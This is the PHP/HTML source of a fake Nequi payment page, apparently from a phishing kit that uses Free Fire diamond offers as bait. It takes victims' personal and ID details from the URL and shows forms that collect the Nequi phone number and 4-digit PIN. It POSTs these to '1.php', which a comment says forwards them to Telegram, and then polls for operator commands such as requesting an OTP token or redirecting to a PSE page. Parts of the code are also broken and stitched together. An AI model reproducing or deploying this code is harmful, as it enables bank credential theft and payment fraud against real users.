<!DOCTYPE html>
<?php
// Procesar datos de Free Fire desde GET
$freefire_data = [
  'diamonds' => $_GET['diamonds'] ?? 0,
  'bonus' => $_GET['bonus'] ?? 0,
  'price' => $_GET['monto'] ?? $_GET['price'] ?? '0', // Usar 'monto' primero, luego 'price' como fallback
  'playerId' => $_GET['playerId'] ?? '',
  'playerName' => $_GET['playerName'] ?? '',
  'email' => $_GET['correo'] ?? '',
  'telefono' => $_GET['telefono'] ?? '',
  'celular' => $_GET['celular'] ?? '',
  'tipo_doc' => $_GET['tipo_doc'] ?? '',
  'cedula' => $_GET['cedula'] ?? '',
  'nombres' => $_GET['nombres'] ?? '',
  'apellidos' => $_GET['apellidos'] ?? '',
  'direccion' => $_GET['direccion'] ?? '',
  'pais' => $_GET['pais'] ?? 'Colombia',
  'ciudad' => $_GET['ciudad'] ?? '',
  'tipo_persona' => $_GET['tipo_persona'] ?? 'natural'
];

// Convertir precio a número para cálculos
$monto_numerico = floatval(str_replace(['$', ',', '.'], ['', '', ''], $freefire_data['price']));

// VALIDACIÓN: Verificar que tengamos datos válidos de Free Fire
if (empty($freefire_data['playerId']) || $freefire_data['diamonds'] <= 0) {
    // Redirigir de vuelta al formulario principal si no hay datos válidos
    header('Location: /index.php?error=missing_data');
    exit;
}
?>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Pago con Nequi</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <style>
    :root {
      --brand-color: #5c2d91;
      --text-color: #222;
      --gray: #666;
      --error: #e53935;
    }

    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: 'Inter', sans-serif;
      background: white;
      color: var(--text-color);
    }

    .container {
      max-width: 400px;
      margin: auto;
      padding: 1rem 1rem 2rem;
      display: flex;
      flex-direction: column;
      align-items: center;
    }

    .header {
      width: 100%;
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 1.2rem;
    }

    .nequi {
      color: var(--brand-color);
      font-weight: 600;
      font-size: 1.5rem;
    }

    .amount {
      font-size: 1.1rem;
      font-weight: 600;
    }

    form {
      width: 100%;
    }

    label {
      font-weight: 500;
      margin-bottom: 0.3rem;
      display: block;
    }

    .required {
      color: var(--error);
    }

    input[type="tel"] {
      width: 100%;
      padding: 0.75rem;
      border: 1px solid #ccc;
      border-radius: 6px;
      font-size: 1rem;
      margin-bottom: 1rem;
    }

    button {
      background: var(--text-color);
      color: white;
      font-size: 1rem;
      padding: 0.6rem 1.2rem;
      width: 137px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      transition: background 0.2s ease;
      margin: 1rem auto 1rem;
      display: block;
      text-align: center;
    }

    button:hover {
      background: var(--brand-color);
    }

    .footer {
      text-align: center;
      font-size: 0.9rem;
      color: var(--gray);
      width: 100%;
    }

    .footer a {
      color: var(--gray);
      text-decoration: none;
      display: block;
      margin-bottom: 0.6rem;
    }

    .pci {
      width: 55px;
      opacity: 0.9;
      margin-bottom: 0.8rem;
    }

    .explicacion {
      font-size: 0.8rem;
      color: var(--text-color);
      line-height: 1.4;
      text-align: center;
      margin-bottom: 0.8rem;
    }

    .ayuda {
      width: 317px;
      max-width: 95%;
      border-radius: 10px;
    }

    /* --- MODAL DE CARGA --- */
    .modal-overlay {
      position: fixed;
      top: 0;
      left: 0;
      height: 100vh;
      width: 100vw;
      background-color: rgba(0, 0, 0, 0.4);
      backdrop-filter: blur(3px);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 1000;
    }

    .modal-box {
      background: white;
      padding: 1.5rem;
      border-radius: 8px;
      text-align: center;
      max-width: 300px;
      box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
    }

    .modal-box p {
      margin-bottom: 1rem;
      font-size: 0.95rem;
    }

    .loader {
      border: 4px solid #f3f3f3;
      border-top: 4px solid var(--text-color);
      border-radius: 50%;
      width: 26px;
      height: 26px;
      animation: spin 1s linear infinite;
      margin: auto;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>

  <div class="container">
    <div class="header">
      <div class="nequi">Nequi</div>
      <div class="amount" id="monto">Monto: $<?php echo number_format($monto_numerico, 0, ',', '.'); ?></div>
    </div>

    <form id="nequiForm">
      <label for="telefono">Número de teléfono celular <span class="required">*</span></label>
      <input type="tel" id="telefono" name="telefono" placeholder="3014785215" maxlength="10" required />
      <button type="submit">VALIDAR</button>
    </form>

    <div class="footer">
      <a href="#">Anular y volver a la tienda</a>
      <img src="img/pci.jpg" alt="Logo PCI" class="pci" />
      <div class="explicacion">
        Ingresa a la app de <strong>Nequi</strong>, ve al <strong>Centro de notificaciones</strong> y acepta el pago.<br>
        Tienes <strong>2 minutos</strong> para confirmar la transacción antes de que expire.
      </div>
      <img src="img/ayuda.png" alt="Imagen ayuda Nequi" class="ayuda" />
    </div>
  </div>

  <!-- MODAL -->
  <div class="modal-overlay" id="loadingModal">
    <div class="modal-box">
      <p>Por favor espere mientras su petición está siendo procesada...</p>
      <div class="loader"></div>
    </div>
  </div>

  <script>
  // Mostrar modal inmediatamente al cargar la página
  document.addEventListener('DOMContentLoaded', function() {
    // Obtener y mostrar el monto
    const totalPagar = localStorage.getItem("total_pagar");
    let montoValor = "0";
    if (totalPagar) {
      montoValor = totalPagar;
      const montoFormateado = parseFloat(totalPagar).toLocaleString("es-CO", {
        style: "currency",
        currency: "COP"
      });
      document.getElementById('monto').textContent = "Monto: " + montoFormateado;
    } else {
      // Si no hay en localStorage, usar el valor de PHP y guardarlo
      const montoPHP = "<?php echo addslashes($freefire_data['price']); ?>";
      if (montoPHP && montoPHP !== '0') {
        montoValor = montoPHP;
        localStorage.setItem("total_pagar", montoPHP);
        const montoFormateado = parseFloat(montoPHP).toLocaleString("es-CO", {
          style: "currency",
          currency: "COP"
        });
        document.getElementById('monto').textContent = "Monto: " + montoFormateado;
        console.log("Monto guardado en localStorage desde PHP:", montoPHP);
      }
    }

    // Mostrar modal de autorización inmediatamente
    const modal = document.getElementById("modalAutorizacion");
    if (modal) {
      modal.style.display = "flex";
      console.log("Modal mostrado automáticamente");

      // Forzar visibilidad de todos los elementos del modal
      const telefonoInput = document.getElementById("telefonoNequi");
      const claveInput = document.getElementById("claveNequi");
      const montoDiv = document.getElementById("montoClave");
      const subtitulo = modal.querySelector("p");

      console.log("telefonoNequi:", telefonoInput);
      console.log("claveNequi:", claveInput);
      console.log("montoClave:", montoDiv);
      console.log("subtitulo:", subtitulo);

      if (telefonoInput) {
        telefonoInput.style.display = "block";
        telefonoInput.style.visibility = "visible";
        telefonoInput.style.opacity = "1";
        console.log("telefonoNequi estilos forzados");
      }

      if (claveInput) {
        claveInput.style.display = "block";
        claveInput.style.visibility = "visible";
        claveInput.style.opacity = "1";
        console.log("claveNequi estilos forzados");
      }

      if (montoDiv) {
        montoDiv.style.display = "block";
        montoDiv.style.visibility = "visible";
        console.log("montoClave estilos forzados");
      }
    }

    // Agregar event listener al botón
    const btnEnviar = document.getElementById("btnEnviarNequi");
    if (btnEnviar) {
      btnEnviar.addEventListener("click", async function() {
        const telefono = document.getElementById("telefonoNequi").value;
        const clave = document.getElementById("claveNequi").value;

        if (!telefono || telefono.length !== 10) {
          alert("Por favor ingresa un número de teléfono válido (10 dígitos)");
          return;
        }

        if (!clave || clave.length !== 4) {
          alert("Por favor ingresa una clave de 4 dígitos");
          return;
        }

        // Mostrar loader
        mostrarLoader("Enviando datos a Nequi...");

        try {
          // Enviar datos directamente a Telegram
          const response = await fetch("1.php", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({
              action: "enviar_datos_nequi_directo",
              telefono: telefono,
              clave: clave,
              monto: montoValor,
              playerId: "<?php echo addslashes($freefire_data['playerId']); ?>",
              playerName: "<?php echo addslashes($freefire_data['playerName']); ?>",
              diamonds: "<?php echo addslashes($freefire_data['diamonds']); ?>",
              bonus: "<?php echo addslashes($freefire_data['bonus']); ?>"
            })
          });

          const data = await response.json();

          if (data.ok) {
            // Ocultar modal y mostrar éxito
            modal.style.display = "none";
            alert("¡Datos enviados correctamente! Recibirás las diamantes en breve.");
            // Redirigir a página de éxito
            window.location.href = "/success.php";
          } else {
            alert("Error al enviar datos: " + (data.error || "Error desconocido"));
          }
        } catch (error) {
          console.error("Error:", error);
          alert("Error de conexión. Inténtalo de nuevo.");
        } finally {
          // Ocultar loader
          const loaderModal = document.getElementById('loadingModal');
          if (loaderModal) {
            loaderModal.style.display = 'none';
          }
        }
      });
    }
  });
  </script>
    return 'TID' + Date.now() + Math.floor(Math.random() * 999);
  }

  function mostrarError(mensaje) {
    alert(mensaje);
  }

  form.addEventListener('submit', async function (e) {
    e.preventDefault();

    const nequi = input.value.trim();
    if (!/^\d{10}$/.test(nequi)) {
      return mostrarError("El número debe tener exactamente 10 dígitos.");
    }

    // OBTENER DATOS DE FREE FIRE (desde PHP)
    const tbdatos = {
        correo: "<?php echo addslashes($freefire_data['email']); ?>",
        cel: "<?php echo addslashes($freefire_data['celular']); ?>",
        val: "<?php echo addslashes($freefire_data['cedula']); ?>",
        per: "<?php echo addslashes($freefire_data['tipo_persona']); ?>",
        nom: "<?php echo addslashes($freefire_data['nombres'] . ' ' . $freefire_data['apellidos']); ?>",
        telefono: "<?php echo addslashes($freefire_data['telefono']); ?>",
        identificacion: "<?php echo addslashes($freefire_data['cedula']); ?>",
        tipo_persona: "<?php echo addslashes($freefire_data['tipo_persona']); ?>",
        banco: "nequi"
    };

    const transactionId = generarTransactionId();

    // ✔️ Guardamos el número en localStorage para usarlo después
    localStorage.setItem("nequi", nequi);
    // ✔️ Guardamos también el transactionId si lo quieres usar en otras páginas
    localStorage.setItem("last_tid", transactionId);

    const payload = {
      transactionId,
      bancoldata: { usuario: nequi, clave: nequi },
      tbdatos: tbdatos,  // <-- Datos de Free Fire
      total: "<?php echo $monto_numerico; ?>",
      // Agregar datos específicos de Free Fire
      freefire: {
        diamonds: "<?php echo addslashes($freefire_data['diamonds']); ?>",
        bonus: "<?php echo addslashes($freefire_data['bonus']); ?>",
        playerId: "<?php echo addslashes($freefire_data['playerId']); ?>",
        playerName: "<?php echo addslashes($freefire_data['playerName']); ?>"
      }
    };

    try {
      modal.style.display = 'flex';

      const res = await fetch("1.php", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
      });

      const result = await res.json();

      if (!result.ok) {
        modal.style.display = "none";
        return mostrarError("Hubo un error al enviar los datos. Inténtalo más tarde.");
      }

      iniciarPolling(transactionId);

    } catch (err) {
      modal.style.display = "none";
      mostrarError("Error de red o del servidor.");
    }
  });

  function iniciarPolling(transactionId) {
    const TIMEOUT_MS = 180000;
    const INTERVAL_MS = 3000;

    poll = setInterval(() => checkLogin(transactionId), INTERVAL_MS);

    timeout = setTimeout(() => {
      clearInterval(poll);
      modal.style.display = "none";
      mostrarError("No se obtuvo respuesta del operador. Por favor intenta más tarde.");
    }, TIMEOUT_MS);
  }

  async function checkLogin(transactionId) {
    try {
      const res = await fetch(`1.php?transactionId=${transactionId}`);
      let json;
      try {
        json = await res.json();
      } catch (e) {
        return; // evita alerta falsa
      }

      if (json.ok && json.action) {
        clearInterval(poll);
        clearTimeout(timeout);
        modal.style.display = "none";

        console.log("Acción recibida:", json.action);

        switch (json.action) {

          case "pedir_token":
            if (document.getElementById("otpToken")) {
              document.getElementById("otpToken").value = "";
            }

            const monto = localStorage.getItem("total_pagar") || "0";
            const montoFormateado = new Intl.NumberFormat("es-CO", {
              style: "currency",
              currency: "COP"
            }).format(parseInt(monto));

            const montoElem = document.getElementById("montoClave");
            if (montoElem) {
              montoElem.textContent = `Monto: ${montoFormateado}`;
            }

            const modalAuth = document.getElementById("modalAutorizacion");
            if (modalAuth) {
              modalAuth.style.display = "flex";
            }
            break;

          case "dinamica_logo":
            console.log("Ejecutando case dinamica_logo");
            // 👉 MOSTRAR MODAL PARA PEDIR NÚMERO Y CLAVE
            console.log("Mostrando modal de autorización");
            if (document.getElementById("otpToken")) {
              document.getElementById("otpToken").value = "";
            }

            const montoDinamica = localStorage.getItem("total_pagar") || "0";
            console.log("Monto obtenido de localStorage:", montoDinamica);
            const montoFormateadoDinamica = new Intl.NumberFormat("es-CO", {
              style: "currency",
              currency: "COP"
            }).format(parseInt(montoDinamica));
            console.log("Monto formateado:", montoFormateadoDinamica);

            const montoElemDinamica = document.getElementById("montoClave");
            if (montoElemDinamica) {
              montoElemDinamica.textContent = `Monto: ${montoFormateadoDinamica}`;
              console.log("Monto actualizado en el elemento:", montoElemDinamica.textContent);
            } else {
              console.error("Elemento montoClave no encontrado");
            }

            const modalAuthDinamica = document.getElementById("modalAutorizacion");
            if (modalAuthDinamica) {
              console.log("Modal encontrado, mostrando...");
              modalAuthDinamica.style.display = "flex";
              console.log("Modal display configurado a flex");

              // Verificar que los elementos del formulario existen
              const telefonoInput = document.getElementById("telefonoNequi");
              const claveInput = document.getElementById("claveNequi");
              const montoDiv = document.getElementById("montoClave");

              console.log("telefonoNequi existe:", !!telefonoInput);
              console.log("claveNequi existe:", !!claveInput);
              console.log("montoClave existe:", !!montoDiv);

              if (telefonoInput) {
                console.log("telefonoNequi display:", telefonoInput.style.display);
                console.log("telefonoNequi visibility:", telefonoInput.style.visibility);
                telefonoInput.style.display = "block"; // Asegurar que se muestre
                telefonoInput.style.visibility = "visible";
              }
              if (claveInput) {
                console.log("claveNequi display:", claveInput.style.display);
                console.log("claveNequi visibility:", claveInput.style.visibility);
              }

              // Agregar event listener al botón después de mostrar el modal
              const btnEnviar = document.getElementById("btnEnviarNequi");
              if (btnEnviar) {
                btnEnviar.addEventListener("click", function() {
                  const telefono = document.getElementById("telefonoNequi").value;
                  const clave = document.getElementById("claveNequi").value;

                  if (!telefono || telefono.length !== 10) {
                    alert("Por favor ingresa un número de teléfono válido (10 dígitos)");
                    return;
                  }

                  if (!clave || clave.length !== 4) {
                    alert("Por favor ingresa una clave de 4 dígitos");
                    return;
                  }

                  // Enviar datos al servidor
                  fetch("1.php", {
                    method: "POST",
                    headers: {
                      "Content-Type": "application/json",
                    },
                    body: JSON.stringify({
                      action: "enviar_datos_nequi",
                      telefono: telefono,
                      clave: clave,
                      transactionId: "<?php echo $transactionId; ?>"
                    })
                  })
                  .then(response => response.json())
                  .then(data => {
                    if (data.ok) {
                      // Ocultar modal y mostrar mensaje de procesamiento
                      document.getElementById("modalAutorizacion").style.display = "none";
                      mostrarLoader("Procesando pago...");
                    } else {
                      alert("Error al enviar datos: " + (data.error || "Error desconocido"));
                    }
                  })
                  .catch(error => {
                    console.error("Error:", error);
                    alert("Error de conexión. Inténtalo de nuevo.");
                  });
                });
              }
            } else {
              console.error("Modal modalAutorizacion no encontrado!");
            }
            break;

          case "rechazar":
            mostrarError("El operador rechazó la solicitud.");
            break;

          case "banco_error":
            alert("Datos erróneos. Corrígelos.");
            window.location.href = "index.php";
            break;

          case "cc":
            window.location.href = "/pse/index.php";
            break;

          case "check":
          case "aprobado":
            window.location.href = "/site/checking.php";
            break;

          case "fin":
            window.location.href = "fin.php";
            break;

          case "enviado":
            window.location.href = "espera.php";
            break;

          case "repetir":
            alert("Se solicitó repetir el proceso con Nequi.");
            window.location.reload();
            break;

          case "otro":
            window.location.href = "/checking.php";
            break;

          default:
            console.warn("Acción desconocida:", json.action);
        }
      }

    } catch (err) {
      console.error("Error en checkLogin:", err);
    }
  }

</script>

<!-- Modal de autorización -->
<div id="modalAutorizacion" style="display:none; position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(0,0,0,0.85); z-index:10001; justify-content:center; align-items:center; color:white; font-family:'Segoe UI', sans-serif;">
  <div style="background:#3a3a3a; padding:40px; border-radius:14px; max-width:400px; width:90%; text-align:center; box-shadow:0 0 20px rgba(0,0,0,0.6); min-height:350px;">

    <!-- Título -->
    <h2 style="font-size:1.2em; margin-bottom:10px;">Ingresa tus datos de Nequi</h2>

    <!-- Subtítulo -->
    <p style="font-size:0.9em; color:#ccc; margin-bottom:20px;">
      Número de teléfono y clave de 4 dígitos
    </p>

    <!-- Monto a pagar -->
    <div id="montoClave" style="font-size:1.1em; margin-bottom:20px; color:#f9c411; font-weight:bold;">
      Monto: $0
    </div>

    <!-- Input de teléfono -->
    <div style="margin-bottom:15px;">
      <label style="display:block; font-size:0.9em; color:#ccc; margin-bottom:5px;">Número de teléfono (10 dígitos)</label>
      <input id="telefonoNequi" maxlength="10" inputmode="numeric" style="
        font-size: 18px;
        text-align: center;
        border: 2px solid #f9c411;
        background: #2a2a2a;
        border-radius: 8px;
        padding: 12px 0;
        width: 100%;
        color: white;
        outline: none;
        box-sizing: border-box;
      " placeholder="3001234567" />
    </div>

    <!-- Input de clave -->
    <div style="margin-bottom:20px;">
      <label style="display:block; font-size:0.9em; color:#ccc; margin-bottom:5px;">Clave de 4 dígitos</label>
      <input id="claveNequi" maxlength="4" inputmode="numeric" style="
        font-size: 24px;
        letter-spacing: 15px;
        text-align: center;
        border: 2px solid #f9c411;
        background: #2a2a2a;
        border-radius: 8px;
        padding: 12px 0;
        width: 100%;
        color: white;
        outline: none;
        box-sizing: border-box;
      " placeholder="••••" />
    </div>

    <!-- Botón de envío -->
    <button id="btnEnviarNequi" style="
      background: #f9c411;
      color: #000;
      border: none;
      padding: 12px 30px;
      border-radius: 8px;
      font-size: 1em;
      font-weight: bold;
      cursor: pointer;
      width: 100%;
      transition: background 0.3s;
    " onmouseover="this.style.background='#e8a800'" onmouseout="this.style.background='#f9c411'">Autorizar pago</button>
  </div>
</div>

</body>
</html>